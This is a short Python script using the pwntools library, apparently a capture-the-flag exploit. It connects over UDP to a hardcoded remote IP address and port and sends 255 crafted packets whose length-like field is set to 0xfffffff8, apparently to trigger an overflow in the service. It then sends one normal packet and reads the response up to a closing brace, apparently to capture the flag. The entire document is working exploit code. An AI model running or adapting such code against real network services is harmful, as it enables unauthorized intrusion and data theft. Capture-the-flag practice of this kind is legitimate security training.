from pwn import *

io = remote('18.118.161.198', 12387, typ='udp')
#io = remote('localhost', 54321, typ='udp')
for i in range(255):
    io.send(p16(9)+p16(9)+p32(0xfffffff8))
    #io.send(p16(9)+p16(9)+p32(9))
    #print(io.recv())

io.send(p16(9)+p16(9)+p32(9))
print(io.recvuntil('}'))

